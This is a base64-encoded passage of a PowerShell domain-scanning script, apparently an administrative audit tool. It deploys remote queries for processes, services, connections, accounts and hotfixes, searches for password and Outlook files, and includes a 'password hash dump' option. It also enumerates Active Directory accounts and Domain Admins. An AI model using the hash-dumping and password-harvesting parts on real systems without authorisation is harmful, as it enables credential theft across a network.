c2tzQ29kZV9CQVR9CiAgICAgICAgNnsKCQkJJFNjcmlwdDpEZXBsb3kgPSAkdHJ1ZQogICAgICAgICAgICAkU2NyaXB0OlNjYW5UeXBlPSJydW5uaW5nIHByb2Nlc3NlcyBxdWVyeSIKICAgICAgICAgICAgJFNjcmlwdDpvdXRmaWxlPSJSdW5uaW5nUHJvY3MkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCgkJCSRTY3JpcHQ6c2Nhbi5SZW1vdGVEYXRhRmlsZSA9ICJSdW5uaW5nUHJvY3MzOTIxMjUyODEiCgkJCSRTY3JpcHQ6c2Nhbi5UaW1lT3V0ID0gMTIwCgkJCSRTY3JpcHQ6c2Nhbi5QUzFDb2RlID0gJFJ1bm5pbmdQcm9jc0NvZGVfUFMxCgkJCSRTY3JpcHQ6c2Nhbi5CQVRDb2RlID0gJFJ1bm5pbmdQcm9jc0NvZGVfQkFUfQogICAgICAgIDd7CgkJCSRTY3JpcHQ6RGVwbG95ID0gJHRydWUKICAgICAgICAgICAgJFNjcmlwdDpTY2FuVHlwZT0iZHJpdmVyIHF1ZXJ5IgogICAgICAgICAgICAkU2NyaXB0Om91dGZpbGU9IkRyaXZlcnMkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCgkJCSRTY3JpcHQ6c2Nhbi5SZW1vdGVEYXRhRmlsZSA9ICJEcml2ZXJzMzkyMTI1MjgxIgoJCQkkU2NyaXB0OnNjYW4uVGltZU91dCA9IDEyMAoJCQkkU2NyaXB0OnNjYW4uUFMxQ29kZSA9ICRRdWVyeURyaXZlcnNDb2RlX1BTMQoJCQkkU2NyaXB0OnNjYW4uQkFUQ29kZSA9ICRRdWVyeURyaXZlcnNDb2RlX0JBVH0KICAgICAgICA4ewoJCQkkU2NyaXB0OkRlcGxveSA9ICR0cnVlCiAgICAgICAgICAgICRTY3JpcHQ6U2NhblR5cGU9InNlcnZpY2UgcXVlcnkiCiAgICAgICAgICAgICRTY3JpcHQ6b3V0ZmlsZT0iU2VydmljZXMkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCgkJCSRTY3JpcHQ6c2Nhbi5SZW1vdGVEYXRhRmlsZSA9ICJTZXJ2aWNlczM5MjEyNTI4MSIKCQkJJFNjcmlwdDpzY2FuLlRpbWVPdXQgPSAxMjAKCQkJJFNjcmlwdDpzY2FuLlBTMUNvZGUgPSAkUXVlcnlTZXJ2aWNlc0NvZGVfUFMxCgkJCSRTY3JpcHQ6c2Nhbi5CQVRDb2RlID0gJFF1ZXJ5U2VydmljZXNDb2RlX0JBVH0KCQkJCiAgICAgICAgOXsKCQkJJFNjcmlwdDpEZXBsb3kgPSAkdHJ1ZQogICAgICAgICAgICAkU2NyaXB0OlNjYW5UeXBlPSJuZXR3b3JrIGNvbm5lY3Rpb25zIHF1ZXJ5IgogICAgICAgICAgICAkU2NyaXB0Om91dGZpbGU9Ik5ldFN0YXQkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCgkJCSRTY3JpcHQ6c2Nhbi5SZW1vdGVEYXRhRmlsZSA9ICJOZXRzdGF0MzkyMTI1MjgxIgoJCQkkU2NyaXB0OnNjYW4uVGltZU91dCA9IDYwMAoJCQkkU2NyaXB0OnNjYW4uUFMxQ29kZSA9ICROZXRzdGF0Q29kZV9QUzEKCQkJJFNjcmlwdDpzY2FuLkJBVENvZGUgPSAkTmV0c3RhdENvZGVfQkFUfQogICAgICAgIDEwewoJCQkkU2NyaXB0OkRlcGxveSA9ICR0cnVlCiAgICAgICAgICAgICRTY3JpcHQ6U2NhblR5cGU9Imluc3RhbGxlZCBzb2Z0d2FyZSBxdWVyeSIKICAgICAgICAgICAgJFNjcmlwdDpvdXRmaWxlPSJTb2Z0d2FyZSQoKGdldC1kYXRlKS50b3N0cmluZygiSEhtbXNzIikpLmNzdiIKCQkJJFNjcmlwdDpzY2FuLlJlbW90ZURhdGFGaWxlID0gIkluc3RhbGxlZFNvZnR3YXJlMzkyMTI1MjgxIgoJCQkkU2NyaXB0OnNjYW4uVGltZU91dCA9IDI0MAoJCQkkU2NyaXB0OnNjYW4uUFMxQ29kZSA9ICRJbnN0YWxsZWRTb2Z0d2FyZUNvZGVfUFMxCgkJCSRTY3JpcHQ6c2Nhbi5CQVRDb2RlID0gJEluc3RhbGxlZFNvZnR3YXJlQ29kZV9CQVR9ICAKICAgICAgICAxMXsKCQkJJFNjcmlwdDpEZXBsb3kgPSAkdHJ1ZQogICAgICAgICAgICAkU2NyaXB0OlNjYW5UeXBlPSJuZXR3b3JrIHNoYXJlcyBxdWVyeSIKICAgICAgICAgICAgJFNjcmlwdDpvdXRmaWxlPSJOZXR3b3JrU2hhcmVzJCgoZ2V0LWRhdGUpLnRvc3RyaW5nKCJISG1tc3MiKSkuY3N2IgoJCQkkU2NyaXB0OnNjYW4uUmVtb3RlRGF0YUZpbGUgPSAiTmV0d29ya1NoYXJlczM5MjEyNTI4MSIKCQkJJFNjcmlwdDpzY2FuLlRpbWVPdXQgPSAxMjAKCQkJJFNjcmlwdDpzY2FuLlBTMUNvZGUgPSAkU2hhcmVzQ29kZV9QUzEKCQkJJFNjcmlwdDpzY2FuLkJBVENvZGUgPSAkU2hhcmVzQ29kZV9CQVR9CiAgICAgICAgMTJ7CgkJCSRTY3JpcHQ6RGVwbG95ID0gJGZhbHNlCgkJCSRTY3JpcHQ6b3V0ZmlsZT0iTmV0d29ya1NoYXJlc1Blcm1pc3Npb25zJCgoZ2V0LWRhdGUpLnRvc3RyaW5nKCJISG1tc3MiKSkuY3N2IgoJCQlOZXR3b3JrU2hhcmVzUGVybWlzc2lvbnN9CiAgICAgICAgMTN7CiAgICAgICAgICAgICMhISEhISEhVGhpcyBjaGVjayBkb2VzIG5vdCB3b3JrIG9uIHNlcnZlcnMuICBDaGVjayBzZXJ2ZXJzIG1hbnVhbGx5ISEhISEhCgkJCSRTY3JpcHQ6RGVwbG95ID0gJHRydWUKICAgICAgICAgICAgJFNjcmlwdDpTY2FuVHlwZT0iYW50aXZpcnVzIHN0YXR1cyBjaGVja3MiCiAgICAgICAgICAgICRTY3JpcHQ6b3V0ZmlsZT0iQW50aXZpcnVzU3RhdHVzJCgoZ2V0LWRhdGUpLnRvc3RyaW5nKCJISG1tc3MiKSkuY3N2IgoJCQkkU2NyaXB0OnNjYW4uUmVtb3RlRGF0YUZpbGUgPSAiQW50aXZpcnVzU3RhdHVzMzkyMTI1MjgxIgoJCQkkU2NyaXB0OnNjYW4uVGltZU91dCA9IDEyMAoJCQkkU2NyaXB0OnNjYW4uUFMxQ29kZSA9ICRBbnRpdmlydXNTdGF0dXNDb2RlX1BTMQoJCQkkU2NyaXB0OnNjYW4uQkFUQ29kZSA9ICRBbnRpdmlydXNTdGF0dXNDb2RlX0JBVH0gICAKCQkxNHsKCQkJJFNjcmlwdDpEZXBsb3kgPSAkdHJ1ZQogICAgICAgICAgICAkU2NyaXB0OlNjYW5UeXBlPSJsb2NhbCBhY2NvdW50IGVudW1lcmF0aW9uIgogICAgICAgICAgICAkU2NyaXB0Om91dGZpbGU9IkxvY2FsQWNjb3VudHMkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCgkJCSRTY3JpcHQ6c2Nhbi5SZW1vdGVEYXRhRmlsZSA9ICJMb2NhbEFjY291bnRzMzkyMTI1MjgxIgoJCQkkU2NyaXB0OnNjYW4uVGltZU91dCA9IDkwMAoJCQkkU2NyaXB0OnNjYW4uUFMxQ29kZSA9ICRMb2NhbEFjY291bnRzQ29kZV9QUzEKCQkJJFNjcmlwdDpzY2FuLkJBVENvZGUgPSAkTG9jYWxBY2NvdW50c0NvZGVfQkFUfQogICAgICAgIDE1ewoJCQkkU2NyaXB0OkRlcGxveSA9ICRmYWxzZQogICAgICAgICAgICAkU2NyaXB0OlNjYW5UeXBlPSJ1c2VyIGFjY291bnQgY29tcGxpYW5jZSBxdWVyeSIKICAgICAgICAgICAgJFNjcmlwdDpvdXRmaWxlPSJVc2VyQWNjb3VudHMkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS50eHQiCgkJCVdyaXRlLUhvc3QgJChnZXQtRGF0ZSkKCQkJVXNlckFjY291bnRTY2FufQoJCTE2ewoJCQkkU2NyaXB0OkRlcGxveSA9ICR0cnVlCiAgICAgICAgICAgICRTY3JpcHQ6U2NhblR5cGU9ImhvdC1maXggZW51bWVyYXRpb24iCiAgICAgICAgICAgICRTY3JpcHQ6b3V0ZmlsZT0iSG90Rml4SW5mbyQoKGdldC1kYXRlKS50b3N0cmluZygiSEhtbXNzIikpLmNzdiIKCQkJJFNjcmlwdDpzY2FuLlJlbW90ZURhdGFGaWxlID0gIkhvdEZpeERhdGEzOTIxMjUyODEiCgkJCSRTY3JpcHQ6c2Nhbi5UaW1lT3V0ID0gMjQwCgkJCSRTY3JpcHQ6c2Nhbi5QUzFDb2RlID0gJEhvdEZpeENvZGVfUFMxCgkJCSRTY3JpcHQ6c2Nhbi5CQVRDb2RlID0gJEhvdEZpeENvZGVfQkFUfSAKCQkKCQkxMDF7CgkJCSRTY3JpcHQ6RGVwbG95ID0gJHRydWUKICAgICAgICAgICAgJFNjcmlwdDpTY2FuVHlwZT0iaW1hZ2UgZmlsZSBzZWFyY2giCiAgICAgICAgICAgICRTY3JpcHQ6b3V0ZmlsZT0iSW1hZ2VGaWxlU2VhcmNoJCgoZ2V0LWRhdGUpLnRvc3RyaW5nKCJISG1tc3MiKSkuY3N2IgoJCQkkU2NyaXB0OnNjYW4uUmVtb3RlRGF0YUZpbGUgPSAiSW1hZ2VGaWxlU2VhcmNoMzkyMTI1MjgxIgoJCQkkU2NyaXB0OnNjYW4uVGltZU91dCA9IDE4MDAKCQkJJFNjcmlwdDpzY2FuLlBTMUNvZGUgPSAkSW1hZ2VTZWFyY2hDb2RlX1BTMQoJCQkkU2NyaXB0OnNjYW4uQkFUQ29kZSA9ICRJbWFnZVNlYXJjaENvZGVfQkFUfQoJCTEwMnsKCQkJJFNjcmlwdDpEZXBsb3kgPSAkdHJ1ZQogICAgICAgICAgICAkU2NyaXB0OlNjYW5UeXBlPSJhdWRpbyBmaWxlIHNlYXJjaCIKICAgICAgICAgICAgJFNjcmlwdDpvdXRmaWxlPSJBdWRpb0ZpbGVTZWFyY2gkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCgkJCSRTY3JpcHQ6c2Nhbi5SZW1vdGVEYXRhRmlsZSA9ICJBdWRpb0ZpbGVTZWFyY2gzOTIxMjUyODEiCgkJCSRTY3JpcHQ6c2Nhbi5UaW1lT3V0ID0gMTgwMAoJCQkkU2NyaXB0OnNjYW4uUFMxQ29kZSA9ICRBdWRpb1NlYXJjaENvZGVfUFMxCgkJCSRTY3JpcHQ6c2Nhbi5CQVRDb2RlID0gJEF1ZGlvU2VhcmNoQ29kZV9CQVR9CgkJMTAzewoJCQkkU2NyaXB0OkRlcGxveSA9ICR0cnVlCiAgICAgICAgICAgICRTY3JpcHQ6U2NhblR5cGU9InZpZGVvIGZpbGUgc2VhcmNoIgogICAgICAgICAgICAkU2NyaXB0Om91dGZpbGU9IlZpZGVvRmlsZVNlYXJjaCQoKGdldC1kYXRlKS50b3N0cmluZygiSEhtbXNzIikpLmNzdiIKCQkJJFNjcmlwdDpzY2FuLlJlbW90ZURhdGFGaWxlID0gIlZpZGVvRmlsZVNlYXJjaDM5MjEyNTI4MSIKCQkJJFNjcmlwdDpzY2FuLlRpbWVPdXQgPSAxODAwCgkJCSRTY3JpcHQ6c2Nhbi5QUzFDb2RlID0gJFZpZGVvU2VhcmNoQ29kZV9QUzEKCQkJJFNjcmlwdDpzY2FuLkJBVENvZGUgPSAkVmlkZW9TZWFyY2hDb2RlX0JBVH0KCQkxMDR7CgkJCSRTY3JpcHQ6RGVwbG95ID0gJHRydWUKICAgICAgICAgICAgJFNjcmlwdDpTY2FuVHlwZT0ic2NyaXB0IGZpbGUgc2VhcmNoIgogICAgICAgICAgICAkU2NyaXB0Om91dGZpbGU9IlNjcmlwdEZpbGVTZWFyY2gkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCgkJCSRTY3JpcHQ6c2Nhbi5SZW1vdGVEYXRhRmlsZSA9ICJTY3JpcHRGaWxlU2VhcmNoMzkyMTI1MjgxIgoJCQkkU2NyaXB0OnNjYW4uVGltZU91dCA9IDE4MDAKCQkJJFNjcmlwdDpzY2FuLlBTMUNvZGUgPSAkU2NyaXB0U2VhcmNoQ29kZV9QUzEKCQkJJFNjcmlwdDpzY2FuLkJBVENvZGUgPSAkU2NyaXB0U2VhcmNoQ29kZV9CQVR9CgkJMTA1ewoJCQkkU2NyaXB0OkRlcGxveSA9ICR0cnVlCiAgICAgICAgICAgICRTY3JpcHQ6U2NhblR5cGU9ImV4ZWN1dGFibGUgZmlsZSBzZWFyY2giCiAgICAgICAgICAgICRTY3JpcHQ6b3V0ZmlsZT0iRXhlY3V0YWJsZUZpbGVTZWFyY2gkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCgkJCSRTY3JpcHQ6c2Nhbi5SZW1vdGVEYXRhRmlsZSA9ICJFeGVjdXRhYmxlRmlsZVNlYXJjaDM5MjEyNTI4MSIKCQkJJFNjcmlwdDpzY2FuLlRpbWVPdXQgPSAxODAwCgkJCSRTY3JpcHQ6c2Nhbi5QUzFDb2RlID0gJEV4ZWN1dGFibGVTZWFyY2hDb2RlX1BTMQoJCQkkU2NyaXB0OnNjYW4uQkFUQ29kZSA9ICRFeGVjdXRhYmxlU2VhcmNoQ29kZV9CQVR9CgkJMTA2ewoJCQkkU2NyaXB0OkRlcGxveSA9ICR0cnVlCiAgICAgICAgICAgICRTY3JpcHQ6U2NhblR5cGU9Ik91dGxvb2sgZGF0YSBmaWxlIHNlYXJjaCIKICAgICAgICAgICAgJFNjcmlwdDpvdXRmaWxlPSJEYXRhRmlsZVNlYXJjaCQoKGdldC1kYXRlKS50b3N0cmluZygiSEhtbXNzIikpLmNzdiIKCQkJJFNjcmlwdDpzY2FuLlJlbW90ZURhdGFGaWxlID0gIkRhdGFGaWxlU2VhcmNoMzkyMTI1MjgxIgoJCQkkU2NyaXB0OnNjYW4uVGltZU91dCA9IDE4MDAKCQkJJFNjcmlwdDpzY2FuLlBTMUNvZGUgPSAkRGF0YUZpbGVTZWFyY2hDb2RlX1BTMQoJCQkkU2NyaXB0OnNjYW4uQkFUQ29kZSA9ICREYXRhRmlsZVNlYXJjaENvZGVfQkFUfQoJCTEwN3sKCQkJJFNjcmlwdDpEZXBsb3kgPSAkdHJ1ZQogICAgICAgICAgICAkU2NyaXB0OlNjYW5UeXBlPSJwYXNzd29yZCBmaWxlIHNlYXJjaCIKICAgICAgICAgICAgJFNjcmlwdDpvdXRmaWxlPSJQYXNzd29yZEZpbGVTZWFyY2gkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCgkJCSRTY3JpcHQ6c2Nhbi5SZW1vdGVEYXRhRmlsZSA9ICJQYXNzd29yZEZpbGVTZWFyY2gzOTIxMjUyODEiCgkJCSRTY3JpcHQ6c2Nhbi5UaW1lT3V0ID0gMTgwMAoJCQkkU2NyaXB0OnNjYW4uUFMxQ29kZSA9ICRQYXNzd29yZFNlYXJjaENvZGVfUFMxCgkJCSRTY3JpcHQ6c2Nhbi5CQVRDb2RlID0gJFBhc3N3b3JkU2VhcmNoQ29kZV9CQVR9CgkJMTEwewoJCQkkU2NyaXB0OkRlcGxveSA9ICR0cnVlCiAgICAgICAgICAgICRTY3JpcHQ6U2NhblR5cGU9InBhc3N3b3JkIGhhc2ggZHVtcCIKICAgICAgICAgICAgJFNjcmlwdDpvdXRmaWxlPSJIYXNoRHVtcCQoKGdldC1kYXRlKS50b3N0cmluZygiSEhtbXNzIikpLmNzdiIKCQkJJFNjcmlwdDpzY2FuLlJlbW90ZURhdGFGaWxlID0gIkhhc2hEdW1wMzkyMTI1MjgxIgoJCQkkU2NyaXB0OnNjYW4uVGltZU91dCA9IDE4MAoJCQkkU2NyaXB0OnNjYW4uUFMxQ29kZSA9ICRQb3dlckR1bXB9CgkJMTExewoJCQkkU2NyaXB0OkRlcGxveSA9ICR0cnVlCiAgICAgICAgICAgICRTY3JpcHQ6U2NhblR5cGU9ImZpbGUgaGFzaGVyIgogICAgICAgICAgICAkU2NyaXB0Om91dGZpbGU9IkZpbGVIYXNoZXMkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS5jc3YiCgkJCSRTY3JpcHQ6c2Nhbi5SZW1vdGVEYXRhRmlsZSA9ICJoYXNoZXMzOTIxMjUyODEiCgkJCSRTY3JpcHQ6c2Nhbi5UaW1lT3V0ID0gMjcwMAoJCQkkU2NyaXB0OnNjYW4uUFMxQ29kZSA9ICRGaWxlSGFzaGVyfQoJCQoJCQoJCSJoIntyZXR1cm59CgkJImhvbWUie3JldHVybn0KCQkieCJ7RXhpdEZ1bmN0aW9ufQoJCSJleGl0IntFeGl0RnVuY3Rpb259CgkJCiAgICAgICAgZGVmYXVsdHsKICAgICAgICAgICAgV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiICAgIEludmFsaWQgQ2hvaWNlOiAkU2VsZWN0aW9uCiAgICAgICAgICAgICIKICAgICAgICAgICAgUmV0dXJuICRmYWxzZQogICAgICAgIH0KICAgIH0KCVJldHVybiAkdHJ1ZQp9CgojUGFyc2UgdGhyb3VnaCBBRCBzZWFyY2ggcmVzdWx0cyBhbmQgcmV0dXJuIHRoZSBsb2dvbiBuYW1lCkZ1bmN0aW9uIEdldFJlc3VsdHMKewoJcGFyYW0oJHJlc3VsdHMpCgkKICAgIEZvcmVhY2goJHJlc3VsdCBpbiAkcmVzdWx0cykKICAgIHsKICAgICAgICAkVXNlciA9ICRyZXN1bHQuR2V0RGlyZWN0b3J5RW50cnkoKQogICAgICAgICR1c2VyLlNBTUFjY291bnROYW1lCiAgICB9Cn0KCiNDb252ZXJ0IERhdGUgdmFsdWVzIGludG8gdGltZSB0aWNrcwpGdW5jdGlvbiBDb252ZXJ0RGF0ZQp7CglwYXJhbSgkRGF5KQoJCiAgICAjQ29udmVydCB0byBkYXRldGltZS4KICAgICREYXRlID0gW0RhdGVUaW1lXSIkRGF5IgoKICAgICMgQ29ycmVjdCBmb3IgZGF5bGlnaHQgc2F2aW5ncy4KICAgIElmICgkRGF0ZS5Jc0RheWxpZ2h0U2F2aW5nVGltZSkKICAgIHsKICAgICAgICAkRGF0ZSA9ICREYXRlLkFkZEhvdXJzKC0xKQogICAgfQoKICAgICMgQ29udmVydCB0aGUgZGF0ZXRpbWUgdmFsdWUsIGluIFVUQywgaW50byB0aGUgbnVtYmVyIG9mIHRpY2tzIHNpbmNlCiAgICAjIDEyOjAwIEFNIEphbnVhcnkgMSwgMTYwMS4KICAgICRWYWx1ZSA9ICgkRGF0ZS5Ub1VuaXZlcnNhbFRpbWUoKSkuVGlja3MgLSAoW0RhdGVUaW1lXSJKYW51YXJ5IDEsIDE2MDEiKS5UaWNrcwogICAgcmV0dXJuICRWYWx1ZQp9CgojZ2V0IHN0YWxlIGFuZCBub24tY29tcGxpYW50IGFjY291bnRzCkZ1bmN0aW9uIHN0YWxlQWNjb3VudHMKewogICAgI1ZhcmlhYmxlcyB0byBob2xkIGRhdGVzICgzMCAmIDQ1IGRheXMgYWdvKSAKICAgICQzMERheXMgPSAoZ2V0LWRhdGUpLmFkZGRheXMoLTMwKQogICAgJDQ1RGF5cyA9IChnZXQtZGF0ZSkuYWRkZGF5cygtNDUpCgogICAgI0NyZWF0ZSBhIG5ldyBvYmplY3QgdG8gc2VhcmNoIEFjdGl2ZSBkaXJlY3RvcnkKICAgICNbQURTSV3DouKCrMWTIiBzZWFyY2hlcyBiZWdpbmluZyBpbiB0aGUgdGhlIHJvb3Qgb2YgeW91ciBjdXJyZW50IGRvbWFpbiAKICAgICN5b3UgY2FuIGNoYW5nZSB3aGVyZSB5b3VyIHNlYXJjaCBzdGFydHMgYnkgc3BlY2lmeWluZyB0aGUgQUQgbG9jYXRpb24KICAgICNleGFtcGxlOiBbQURTSV3DouKCrMWTTERBUDovL09VPUNBTkVTIFVzZXJzIGFuZCBDb21wdXRlcnMsREM9Y3ZuNzYsREM9bmF2eSxEQz1taWzDouKCrAogICAgJFNlYXJjaCA9IE5ldy1PYmplY3QgRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIoW0FEU0ldw6LigqzFk8Oi4oKsKQogICAgJFNlYXJjaC5QYWdlU2l6ZSA9IDEwMDAKCiAgICAjQWN0aXZlIGFjY291bnRzIHdpdGggbm8gcGFzc3dvcmQgZXhwaXJhdGlvbiBhbmQgbm8gQ0xPIGVuZm9yY2VkCiAgICBXcml0ZS1PdXRwdXQgIgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KQWN0aXZlIGFjY291bnRzIHdpdGggbm8gcGFzc3dvcmQgZXhwaXJhdGlvbiBhbmQgbm8gQ0xPIGVuZm9yY2VkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIKCiAgICAkU2VhcmNoLmZpbHRlciA9IMOi4oKsxZMoJihvYmplY3RDYXRlZ29yeT1wZXJzb24pKG9iamVjdENsYXNzPXVzZXIpKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj02NTUzNikoISh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9MjYyMTQ0KSkoISh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9MikpKcOi4oKsCiAgICBHZXRSZXN1bHRzKCRTZWFyY2guRmluZGFsbCgpKSB8IHNvcnQKCiAgICAjRGlzYWJsZWQgYWNjb3VudHMgd2l0aCBubyBwYXNzd29yZCBleHBpdGF0aW9uIGFuZCBubyBDTE8gZW5mb3JjZWQKICAgIFdyaXRlLU91dHB1dCAiCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCkRpc2FibGVkIGFjY291bnRzIHdpdGggbm8gcGFzc3dvcmQgZXhwaXJhdGlvbiBhbmQgbm8gQ0xPIGVuZm9yY2VkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIgoKICAgICRTZWFyY2guZmlsdGVyID0gw6LigqzFkygmKG9iamVjdENhdGVnb3J5PXBlcnNvbikob2JqZWN0Q2xhc3M9dXNlcikodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTY1NTM2KSghKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yNjIxNDQpKSh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9Mikpw6LigqwKICAgIEdldFJlc3VsdHMoJFNlYXJjaC5GaW5kYWxsKCkpIHwgc29ydAoKICAgICNBY3RpdmUgYWNjb3VudHMgdGhhdCBoYXZlbid0IGJlZW4gYWNjZXNzZWQgaW4gMzAgZGF5cwogICAgV3JpdGUtT3V0cHV0ICIKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCkFjdGl2ZSBhY2NvdW50cyBub3QgYWNjZXNzZWQgaW4gMzAgZGF5cwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iCgogICAgJFZhbHVlID0gQ29udmVydERhdGUoJDMwRGF5cykKCiAgICAkU2VhcmNoLmZpbHRlciA9IMOi4oKsxZMoJihvYmplY3RDYXRlZ29yeT1wZXJzb24pKG9iamVjdENsYXNzPXVzZXIpKGxhc3RMb2dvbjw9JFZhbHVlKSghKGxhc3RMb2dvbj0wKSkoISh1c2VyQWNjb3VudENvbnRyb2w6MS4yLjg0MC4xMTM1NTYuMS40LjgwMzo9MikpKCEobG9ja291dFRpbWU+PTEpKSnDouKCrAogICAgR2V0UmVzdWx0cygkU2VhcmNoLkZpbmRhbGwoKSkgfCBzb3J0CgogICAgI0FjY291bnRzIG5vdCBhY2Nlc3NlZCBpbiA0NSBkYXlzCiAgICBXcml0ZS1PdXRwdXQgIgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpBY2NvdW50cyBub3QgYWNjZXNzZWQgaW4gNDUgZGF5cwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSIKCiAgICAkVmFsdWUgPSBDb252ZXJ0RGF0ZSgkNDVEYXlzKQoKICAgICNVVEMgZGF0ZSBmb3Igd2hlbmNyZWF0ZWQgY29tcGFyaXNvbgogICAgJFZhbHVlMiA9ICQ0NURheXMuVG9TdHJpbmcoInl5aGhtbXNzLjBaIikKCiAgICAkU2VhcmNoLmZpbHRlciA9IMOi4oKsxZMofCgmKG9iamVjdENhdGVnb3J5PXBlcnNvbikob2JqZWN0Q2xhc3M9dXNlcikobGFzdExvZ29uPD0kVmFsdWUpKCEobGFzdExvZ29uPTApKSkoJihvYmplY3RDYXRlZ29yeT1wZXJzb24pKG9iamVjdENsYXNzPXVzZXIpKHdoZW5DcmVhdGVkPD0kVmFsdWUyKSh8KCEobGFzdExvZ29uPSopKShsYXN0TG9nb249MCkpKSnDouKCrAogICAgR2V0UmVzdWx0cygkU2VhcmNoLkZpbmRhbGwoKSkgfCBzb3J0Cn0KCkZ1bmN0aW9uIFVzZXJBY2NvdW50U2Nhbgp7CgluZXQgZ3JvdXAgIkRvbWFpbiBBZG1pbnMiIC9kb21haW4gfE91dC1GaWxlICIkT1VUX0RJUlxEb21haW5BZG1pbnMkKChnZXQtZGF0ZSkudG9zdHJpbmcoIkhIbW1zcyIpKS50eHQiICNnZXQgbGlzdCBvZiBkb21haW4gYWRtaW5zCglXcml0ZS1Ib3N0IC1Gb3JlZ3JvdW5kQ29sb3IgWWVsbG93ICJDb2xsZWN0aW5nIGFjdGl2ZSBkaXJlY3RvcnkgdXNlciBhY2NvdW50IGRhdGEuIgoJU3RhbGVBY2NvdW50cyB8T3V0LUZpbGUgIiRPVVRfRElSXCRvdXRmaWxlIgoJV3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIEdyZWVuICJEYXRhIGxvY2F0ZWQgYXQgJE9VVF9ESVJcJG91dGZpbGUKCSIKfQoKI1JldHVybiBhIGxpc3Qgb2Ygd2luZG93cyBtYWNoaW5lcyBvbiB0aGUgZG9tYWluCkZ1bmN0aW9uIEdldENvbXB1dGVycwp7CiAgICAjQ3JlYXRlIGEgbmV3IG9iamVjdCB0byBzZWFyY2ggQWN0aXZlIGRpcmVjdG9yeQogICAgI1tBRFNJXcOi4oKsxZMiIHNlYXJjaGVzIGJlZ2lubmluZyBpbiB0aGUgdGhlIHJvb3Qgb2YgeW91ciBjdXJyZW50IGRvbWFpbiAKICAgICN5b3UgY2FuIGNoYW5nZSB3aGVyZSB5b3VyIHNlYXJjaCBzdGFydHMgYnkgc3BlY2lmeWluZyB0aGUgQUQgbG9jYXRpb24KICAgICNleGFtcGxlOiBbQURTSV3DouKCrMWTTERBUDovL09VPUNBTkVTIFVzZXJzIGFuZCBDb21wdXRlcnMsREM9Y3ZuNzYsREM9bmF2eSxEQz1taWzDouKCrAoJCglwYXJhbSgkSG9zdEZpbGUpCgkkU2VhcmNoID0gTmV3LU9iamVjdCBEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlcihbQURTSV0iTERBUDovLyREaXN0aW5ndWlzaGVkTmFtZSIpCgkkU2VhcmNoLlBhZ2VTaXplID0gMTAwMCAjcGFnZSBzaXplIG5lZWRlZCB0byByZXR1cm4gbW9yZSB0aGFuIDEwMDAgZW50cmllcwoJaWYoLW5vdCAoJEhvc3RGaWxlIC1lcSAiQUxMIikpICNob3N0IG5hbWVzIHRvIHNjYW4gcHJvdmlkZWQgYnkgdXNlcgoJewoJCSRIb3N0cyA9IEdldC1Db250ZW50ICRIb3N0RmlsZQoJCVJ1blNjcmlwdEJsb2NrICRHZXRDb21wdXRlcnNTQiAkSG9zdHMgJHNjYW4gfCBzb3J0IC1VbmlxdWUKCX0KCWVsc2UgI2dyYWIgYWxsIGNvbXB1dGVycwoJewoJCSRTZWFyY2guZmlsdGVyID0gIihvYmplY3RDbGFzcz1jb21wdXRlcikiCgkJRm9yZWFjaCgkcmVzdWx0IGluICRTZWFyY2guRmluZGFsbCgpKQoJCXsKCQkJJHJlc3VsdC5HZXREaXJlY3RvcnlFbnRyeSgpfCV7CgkJCQkkbmFtZT0kXy5uYW1lCgkJCQkkb3M9JF8uT3BlcmF0aW5nU3lzdGVtCgkJCQkkdmVyPSRfLk9wZXJhdGluZ1N5c3RlbVZlcnNpb24KCQkJCSIkbmFtZSwkb3MsJHZlciIgfCBTZWxlY3QtU3RyaW5nICJXaW5kb3dzIiB8IFNlbGVjdC1TdHJpbmcgLU5vdE1hdGNoICRlbnY6Q09NUF